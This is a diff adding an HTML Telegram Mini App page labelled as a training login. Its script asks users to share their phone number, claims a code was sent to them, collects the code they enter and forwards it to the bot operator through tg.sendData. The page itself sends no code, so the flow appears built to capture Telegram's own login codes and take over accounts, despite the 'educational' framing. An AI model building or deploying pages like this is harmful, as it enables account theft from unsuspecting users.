@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Учебная Авторизация</title>
+    <!-- Подключаем скрипт Telegram Mini Apps -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--tg-theme-bg-color, #fff);
+            color: var(--tg-theme-text-color, #000);
+            text-align: center;
+            padding: 20px;
+            margin: 0;
+        }
+        .hidden { display: none; }
+        button {
+            background-color: var(--tg-theme-button-color, #3390ec);
+            color: var(--tg-theme-button-text-color, #fff);
+            border: none;
+            padding: 15px;
+            font-size: 16px;
+            border-radius: 10px;
+            width: 100%;
+            cursor: pointer;
+            margin-top: 20px;
+            font-weight: bold;
+        }
+        input {
+            width: 80%;
+            padding: 15px;
+            font-size: 24px;
+            text-align: center;
+            letter-spacing: 5px;
+            border: 1px solid #ccc;
+            border-radius: 10px;
+            margin-top: 20px;
+            background: transparent;
+            color: inherit;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Экран 1: Запрос номера -->
+    <div id="screen-phone">
+        <h2>Добро пожаловать!</h2>
+        <p>Для продолжения поделитесь своим номером телефона.</p>
+        <!-- Кнопка, которая вызывает нативное окно запроса номера -->
+        <button id="share-phone-btn">📱 Поделиться номером</button>
+    </div>
+
+    <!-- Экран 2: Ввод кода -->
+    <div id="screen-code" class="hidden">
+        <h2>Введите код</h2>
+        <p>Мы отправили код на ваш номер: <br><b id="user-phone"></b></p>
+        <input type="number" id="code-input" placeholder="00000">
+        <button id="submit-code-btn">Подтвердить</button>
+    </div>
+
+    <!-- Экран 3: Успех -->
+    <div id="screen-success" class="hidden">
+        <h2>🎉 Успешно!</h2>
+        <p>Вы успешно авторизовались в учебном приложении.</p>
+    </div>
+
+    <script>
+        // Инициализируем Telegram Web App
+        const tg = window.Telegram.WebApp;
+        tg.expand(); // Разворачиваем на весь экран
+
+        const phoneScreen = document.getElementById('screen-phone');
+        const codeScreen = document.getElementById('screen-code');
+        const successScreen = document.getElementById('screen-success');
+        const userPhoneText = document.getElementById('user-phone');
+
+        // 1. Обработка кнопки "Поделиться номером"
+        document.getElementById('share-phone-btn').addEventListener('click', () => {
+            // Вызываем нативное окно Telegram для запроса номера
+            tg.requestContact((shared, contact) => {
+                if (shared) {
+                    // Получаем номер
+                    const phoneNumber = contact.phone_number;
+                    userPhoneText.innerText = "+" + phoneNumber;
+                    
+                    // Переключаем экраны
+                    phoneScreen.classList.add('hidden');
+                    codeScreen.classList.remove('hidden');
+                }
+            });
+        });
+
+        // 2. Обработка кнопки "Подтвердить" (Ввод кода)
+        document.getElementById('submit-code-btn').addEventListener('click', () => {
+            const code = document.getElementById('code-input').value;
+            
+            if (code.length < 4) {
+                tg.showAlert("Введите корректный код!");
+                return;
+            }
+
+            // Отправляем данные в бота (для учебы просто показываем успех)
+            tg.sendData(JSON.stringify({
+                action: "login",
+                code: code
+            }));
+
+            // Показываем экран успеха
+            codeScreen.classList.add('hidden');
+            successScreen.classList.remove('hidden');
+
+            // Закрываем Mini App через 2 секунды
+            setTimeout(() => {
+                tg.close();
+            }, 2000);
+        });
+    </script>
+</body>
+</html>
